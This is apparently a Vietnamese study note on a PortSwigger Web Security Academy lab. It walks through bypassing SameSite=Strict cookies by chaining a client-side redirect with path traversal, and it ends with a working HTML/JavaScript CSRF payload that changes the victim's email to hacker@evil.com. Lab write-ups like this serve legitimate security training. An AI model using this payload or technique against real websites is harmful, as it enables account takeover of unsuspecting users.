![[Pasted image 20260929162804.png]]
- [ ] □ Mục tiêu: Thực hiện tấn công CSRF để thay đổi địa chỉ email của nạn nhân (victim).
- [ ] □ Kỹ thuật yêu cầu: Bypass SameSite=Strict bằng cách lợi dụng lỗ hổng client-side redirect (chuyển hướng phía client) trên chính trang web đó.
- [ ] □ Công cụ: Sử dụng Exploit Server được cung cấp để host payload.
- [ ] □ Tài khoản test: Đăng nhập bằng wiener:peter.
- [ ] □ Môi trường test: Nên dùng Chrome hoặc Burp's built-in browser để đảm bảo cơ chế SameSite hoạt động đúng như nạn nhân.

![[Pasted image 20260929164731.png]]

-dùng katana + burp-> mình liệt kê các enpoint ẩn, sau khi review các enpoint minhgf phát hiện ra 1 enpoint cho phép đi đến các địa chỉ nội bộ -> tức là pathtraversal 
=> từ đây, qua cái enpoint này mình có thể truy cập tới ../change-email
![[Pasted image 20260929173712.png|545]]
  -> đọc mã js của cái enpoint này

![[Pasted image 20260929173742.png|490]]
-> comfrim là có path traversal

![[Pasted image 20260929173900.png]]
--> đây là nguyên nhân trong source dẫn đến lỗi path traversal


``` html
<html>
  <body>
    <script>
      document.location = "https://0aa7000a0464d2f98077124c00fc008b.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacker@evil.com%26submit=1";
    </script>
  </body>
</html>
```
![[Pasted image 20260929173346.png]]